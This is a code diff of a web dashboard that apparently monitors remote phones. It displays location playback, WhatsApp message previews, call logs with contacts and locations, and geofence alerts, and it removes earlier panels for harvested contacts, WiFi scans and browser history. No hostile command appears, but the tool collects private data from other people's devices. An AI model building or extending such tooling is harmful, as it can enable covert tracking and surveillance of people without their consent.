 document.getElementById('rewindBtn').addEventListener('click', () => {
   playbackRunning = false; playbackIdx = 0;
   if (playbackTimer) clearInterval(playbackTimer);
@@ -798,6 +620,7 @@ document.getElementById('rewindBtn').addEventListener('click', () => {
   document.getElementById('playCount').textContent = `0/${playbackPoints.length}`;
   if (playbackPoints.length && marker) marker.setLatLng(playbackPoints[0]);
 });
+
 document.getElementById('playScrubber').addEventListener('input', function() {
   playbackIdx = parseInt(this.value);
   if (playbackPoints[playbackIdx] && marker) marker.setLatLng(playbackPoints[playbackIdx]);
@@ -811,13 +634,13 @@ document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
     chip.classList.add('active');
     timelineFilter = chip.dataset.filter;
-    const docs = []; // re-render from cached if needed
   });
 });
+
 function renderTimeline(docs) {
   const list = document.getElementById('timelineList');
   const filtered = docs.filter(d => {
-    const type = (d.fields?.type?.stringValue || '').toLowerCase();
+    const type = (d.type || '').toLowerCase();
     if (timelineFilter === 'all') return true;
     if (timelineFilter === 'location') return type === 'location';
     if (timelineFilter === 'call') return type.includes('call');
@@ -825,30 +648,32 @@ function renderTimeline(docs) {
     return true;
   }).slice(0, 50);
   list.innerHTML = filtered.map(d => {
-    const f = d.fields || {};
-    const type = f.type?.stringValue || '';
-    const ts = parseInt(f.ts_ms?.integerValue || '0');
+    const type = d.type || '';
+    const ts = parseInt(d.ts_ms || '0');
     const icon = type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : '\u{1F4CD}';
-    const contact = f.contactName?.stringValue || f.contact?.stringValue || f.contactNumber?.stringValue || '';
-    const msg = f.messagePreview?.stringValue || '';
-    const dur = f.duration?.stringValue || '';
-    const dir = f.direction?.stringValue || '';
+    const contact = d.contactName || d.contact || '';
+    const msg = d.messagePreview || '';
+    const dur = d.duration || '';
+    const dir = d.direction || '';
     return `<div class="card">
       <div class="time">${icon} ${pkt(ts)}</div>
-      <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur : ''}${dir ? ' ['+dir+']' : ''}</div>
+      <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}</div>
     </div>`;
   }).join('') || '<div class="label">No entries</div>';
 }
+
 function renderCalls(docs) {
   const body = document.getElementById('callsBody');
-  const calls = docs.filter(d => (d.fields?.type?.stringValue || '').includes('call')).slice(0, 50);
+  const calls = docs.filter(d => (d.type || '').includes('call')).slice(0, 50);
   body.innerHTML = calls.map(d => {
-    const f = d.fields || {};
-    const ts = parseInt(f.ts_ms?.integerValue || '0');
-    const num = f.contactName?.stringValue || f.contact?.stringValue || f.contactNumber?.stringValue || '--';
-    const dur = f.duration?.stringValue || '--';
-    const dir = f.direction?.stringValue || '--';
-    return `<tr><td>${pktShort(ts)}</td><td>${num}</td><td>${dur}</td><td>${dir}</td></tr>`;
+    const ts = parseInt(d.ts_ms || '0');
+    const name = d.contactName || d.contact || '';
+    const number = d.contactNumber || '';
+    const numDisplay = name && number ? `${name} (${number})` : name || number || '--';
+    const dur = d.duration || '--';
+    const dir = d.direction || '--';
+    const loc = d.location || '';
+    return `<tr><td>${pktShort(ts)}</td><td>${numDisplay}</td><td>${dur}s</td><td>${dir}${loc ? '<br><span style="font-size:11px;color:var(--muted)">\u{1F4CD} ' + loc + '</span>' : ''}</td></tr>`;
   }).join('') || '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
 }
 
@@ -856,132 +681,17 @@ function renderCalls(docs) {
 document.addEventListener('keydown', e => {
   if (e.key === 'c' && e.ctrlKey) {
     const text = document.getElementById('coordBox').textContent;
-    if (text !== '--') navigator.clipboard.writeText(text);
+    if (text !== '--' && navigator.clipboard) navigator.clipboard.writeText(text).catch(() => {});
   }
 });
-
-// --- Contacts ---
-async function pollContacts() {
-  if (!selectedDevice) return;
-  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/contacts`);
-  if (!rtdbData || typeof rtdbData !== 'object') {
-    document.getElementById('contactsList').innerHTML = '<div class="label">No contacts data yet</div>';
-    return;
-  }
-  const batches = Object.values(rtdbData);
-  if (!batches.length) { document.getElementById('contactsList').innerHTML = '<div class="label">No contacts data yet</div>'; return; }
-  const latest = batches.sort((a,b) => (b.ts_ms||0) - (a.ts_ms||0))[0];
-  if (!latest.contacts || !latest.contacts.length) return;
-  renderContacts(latest.contacts);
-  if (latest.ts_ms) setCategoryTime('contacts', latest.ts_ms);
-}
-function renderContacts(contacts) {
-  const list = document.getElementById('contactsList');
-  list.innerHTML = contacts.map(c => `
-    <div class="card" data-name="${(c.name||'').toLowerCase()}" data-number="${(c.number||'').toLowerCase()}">
-      <div class="value">${c.name || '--'}</div>
-      <div class="time">${c.number || '--'}</div>
-    </div>`).join('') || '<div class="label">No contacts</div>';
-}
-document.getElementById('contactsSearch').addEventListener('input', function() {
-  const q = this.value.toLowerCase();
-  document.querySelectorAll('#contactsList .card').forEach(card => {
-    const match = card.dataset.name.includes(q) || card.dataset.number.includes(q);
-    card.style.display = match ? '' : 'none';
-  });
-});
-
-// --- WiFi ---
-async function pollWifi() {
-  if (!selectedDevice) return;
-  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/wifi_scan`);
-  if (!rtdbData || typeof rtdbData !== 'object') {
-    document.getElementById('wifiList').innerHTML = '<div class="label">No WiFi data yet</div>';
-    return;
-  }
-  const batches = Object.values(rtdbData);
-  if (!batches.length) { document.getElementById('wifiList').innerHTML = '<div class="label">No WiFi data yet</div>'; return; }
-  const latest = batches.sort((a,b) => (b.ts_ms||0) - (a.ts_ms||0))[0];
-  if (!latest.networks || !latest.networks.length) return;
-  renderWifi(latest.networks);
-  if (latest.ts_ms) setCategoryTime('wifi', latest.ts_ms);
-}
-function renderWifi(networks) {
-  const maxRssi = Math.max(...networks.map(n => n.rssi), -30);
-  const minRssi = Math.min(...networks.map(n => n.rssi), -100);
-  const range = maxRssi - minRssi || 1;
-  const el = document.getElementById('wifiList');
-  el.innerHTML = '<div class="label">' + networks.length + ' networks found</div>' +
-    networks.sort((a,b) => b.rssi - a.rssi).map(n => {
-      const pct = ((n.rssi - minRssi) / range * 100).toFixed(0);
-      return `<div class="card" style="border-left-color:${n.rssi > -60 ? 'var(--success)' : 'var(--muted)'}">
-        <div style="display:flex;justify-content:space-between;align-items:center">
-          <span class="value">${n.ssid || '(hidden)'}</span>
-          <span class="time" style="font-family:monospace">${n.rssi} dBm</span>
-        </div>
-        <div class="bar-row" style="margin-top:4px">
-          <div class="bar-fill" style="width:${pct}%;height:6px;background:${n.rssi > -60 ? 'var(--success)' : 'var(--muted)'}"></div>
-          <span class="bar-val" style="font-size:10px">${(n.frequency/1000).toFixed(1)} GHz</span>
-        </div>
-        <div class="time" style="font-size:10px">${n.bssid || ''} ${n.capabilities ? '| ' + n.capabilities.slice(0,20) : ''}</div>
-        ${n.lat ? '<div class="time" style="font-size:10px">' + n.lat.toFixed(4) + ', ' + n.lng.toFixed(4) + '</div>' : ''}
-      </div>`;
-    }).join('');
-}
-
-// --- Browser History ---
-async function pollBrowser() {
-  if (!selectedDevice) return;
-  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/browser_history`);
-  if (!rtdbData || typeof rtdbData !== 'object') {
-    document.getElementById('browserList').innerHTML = '<div class="label">No browser history yet</div>';
-    return;
-  }
-  const batches = Object.values(rtdbData);
-  if (!batches.length) { document.getElementById('browserList').innerHTML = '<div class="label">No browser history yet</div>'; return; }
-  const latest = batches.sort((a,b) => (b.ts_ms||0) - (a.ts_ms||0))[0];
-  if (!latest.history || !latest.history.length) return;
-  renderBrowser(latest.history);
-  if (latest.ts_ms) setCategoryTime('browser', latest.ts_ms);
-}
-function renderBrowser(history) {
-  const providers = [...new Set(history.map(h => h.provider || 'unknown'))];
-  const el = document.getElementById('browserList');
-  el.innerHTML = '<div class="filter-chips">' +
-    providers.map((p,i) => `<span class="chip ${i===0?'active':''}" data-browser="${p}">${p}</span>`).join('') +
-    '</div>';
-  const activeProvider = providers[0];
-  const filtered = history.filter(h => h.provider === activeProvider).slice(0, 50);
-  el.innerHTML += filtered.map(h => `
-    <div class="card">
-      <div class="value" style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${h.title || h.url}</div>
-      <div class="time" style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">
-        <a href="${h.url}" target="_blank" style="color:var(--accent);text-decoration:none">${h.url}</a>
-      </div>
-      <div style="display:flex;gap:12px;font-size:10px;color:var(--muted);margin-top:2px">
-        <span>${h.dateMs ? pkt(h.dateMs) : '--'}</span>
-        <span>${h.visits} visits</span>
-        <span>${h.provider}</span>
-      </div>
-    </div>`).join('') || '<div class="label">No history for this browser</div>';
-  
-  el.querySelectorAll('.chip[data-browser]').forEach(chip => {
-    chip.addEventListener('click', function() {
-      el.querySelectorAll('.chip[data-browser]').forEach(c => c.classList.remove('active'));
-      this.classList.add('active');
-      const provider = this.dataset.browser;
-      const filtered = history.filter(h => h.provider === provider).slice(0, 50);
-      const cards = el.querySelectorAll('.card');
-      cards.forEach((card, i) => {
-        if (i < filtered.length) card.style.display = '';
-      });
-    });
-  });
-}
 
 // --- Init ---
 async function init() {
-  if (Notification.permission === 'default') Notification.requestPermission();
+  // FIX: Guard Notification API — iOS Safari requires a user gesture and
+  // may not support Notification at all in regular (non-PWA) browsing mode.
+  if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
+    try { await Notification.requestPermission(); } catch {}
+  }
   try { await fetchDevices(); } catch {}
   if (selectedDevice) try { await pollAll(); } catch {}
   startPolling();
@@ -991,6 +701,7 @@ async function init() {
     showAlert('Right-click on map to add geofences', 'warn');
   }
 }
+
 init();
 </script>
 </body>
